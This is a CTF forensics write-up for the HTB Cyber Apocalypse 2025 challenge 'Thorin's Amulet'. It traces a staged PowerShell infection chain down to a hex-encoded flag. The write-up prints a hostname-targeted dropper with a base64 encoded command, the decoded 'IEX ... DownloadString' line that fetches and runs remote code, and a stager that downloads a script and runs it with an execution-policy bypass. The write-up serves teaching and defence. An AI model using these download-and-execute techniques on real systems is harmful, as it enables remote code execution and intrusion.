---
title: "Thorin's Amulet – PowerShell Stager Chain (HTB Cyber Apocalypse 2025)"
tags: [CTF, forensics, powershell, base64, stager, headers, network]
---

# Thorin's Amulet 🖥️💉

![PowerShell](https://img.shields.io/badge/language-PowerShell-blue.svg)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-blue.svg)
![Category](https://img.shields.io/badge/category-Forensics-lightgrey.svg)
![CTF](https://img.shields.io/badge/Event-HTB%20Cyber%20Apocalypse%202025-purple)

Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. 

In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. 

Saboteurs stole the amulet and left behind some tracks. 

Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened? 

Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.

## 📚 Table of Contents

- [Initial Script 📜](#initial-script-)
- [Stage 1 – Decoding the Base64 Payload 🔍](#stage-1--decoding-the-base64-payload-)
- [Stage 2 – Visiting `/update` 📡](#stage-2--visiting-update-)
- [Stage 3 – Extracting the Stager 🧱](#stage-3--extracting-the-stager-)
- [Stage 4 – Using Custom Headers 🌐](#stage-4--using-custom-headers-)
- [Final Payload – Decoding the Flag 🎯](#final-payload--decoding-the-flag-)
- [Conclusion 🧾](#conclusion-)

A mysterious PowerShell script is discovered on an internal host. It seems to target a specific machine — perhaps a part of a larger staged infection system. 

Our mission: **trace the execution, follow the network trail, and extract the flag hidden within.**

## Initial Script 📜

We begin with this PowerShell dropper:

```powershell
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```

Clearly, it:
- Checks that the hostname is `WORKSTATION-DM-0043`
- Executes a **base64-encoded PowerShell command**

## Stage 1 – Decoding the Base64 Payload 🔍

Decoding the string:

```
SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik=
```

We get:

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```

So the script simply **downloads and executes remote PowerShell code** from `/update`.

## Stage 2 – Visiting `/update` 📡

We browse to:

```
http://<IP>:<PORT>/update
```

We get the **next stage** of the infection:

```
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```

This is a **stager** that:
1. Sends a GET request to `/a541a` with a custom header
2. Saves the response as `a541a.ps1`
3. Executes it locally with `-exec Bypass`

## Stage 3 – Extracting the Stager 🧱

We simulate this manually by navigating to:

```
http://<IP>:<PORT>/a541a
```

And adding the correct header:

```
X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d
```

We now get a **base64 response**, as shown in this screenshot:

![DevTools showing base64 blob](https://github.com/user-attachments/assets/08770f51-92aa-4a01-891b-3c4176accd1e)

## Stage 4 – Using Custom Headers 🌐

Once the base64 payload is decoded, we obtain this obfuscated script:

```powershell
$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
```

This:
- Defines a variable with a long **hex-encoded string**
- Splits it into bytes
- Converts to ASCII characters
- Joins it all → revealing the flag

## Final Payload – Decoding the Flag 🎯

We decode the hex manually or via Python/PowerShell:

```text
HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}
```

✅ **Flag captured!**

## Conclusion 🧾

This forensics challenge demonstrated a **classic staged infection chain**, involving:

- Host-based targeting (`$env:COMPUTERNAME`)
- Base64-encoded PowerShell stager
- HTTP requests with **custom headers** (for access control)
- Payloads stored in multiple layers of encoding (Base64 → Hex → ASCII)

**Key takeaways**:
- Always monitor `Invoke-WebRequest` and encoded PowerShell commands
- Pay attention to headers used in suspicious requests
- Encodings can hide important payloads — be ready to decode recursively

🕵️‍♂️ Another threat neutralized in Cyber Apocalypse 2025.

🔙 [Back to Cyber Apocalypse 2025 Writeups](../../)
